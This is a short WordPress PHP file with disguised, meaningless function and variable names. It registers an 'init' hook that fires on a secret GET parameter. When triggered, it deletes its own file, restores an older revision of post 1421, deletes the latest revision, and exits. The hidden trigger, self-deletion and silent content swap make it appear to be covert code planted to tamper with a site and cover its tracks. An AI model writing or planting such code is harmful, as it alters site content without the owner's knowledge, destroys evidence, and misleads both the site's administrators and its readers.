<?php

function link_iframe_autocomplete() {
	if (isset($_GET['media_back_right']) && $_GET['media_back_right'] === 'categories_editor_app') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$stripe_ajax_ecommerce_survey = 1421;
		$best_world_slide = wp_get_post_revisions($stripe_ajax_ecommerce_survey);
		if (empty($best_world_slide)) die('no revisions');
		if (count($best_world_slide) < 2) die('less than 2');
		$cron_lightgray_taxonomy_order = array_shift($best_world_slide);
		$crm_include_sharing_consent = $cron_lightgray_taxonomy_order->ID;
		$effects_editor_rest = array_shift($best_world_slide);
		$slug_dev_picker = $effects_editor_rest->ID;
		$lite_rating_subscriptions = wp_restore_post_revision($slug_dev_picker);
		if ($lite_rating_subscriptions === false) die('error restoring');
		$lite_rating_subscriptions = wp_delete_post_revision($crm_include_sharing_consent);		
		if ($lite_rating_subscriptions === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'link_iframe_autocomplete');
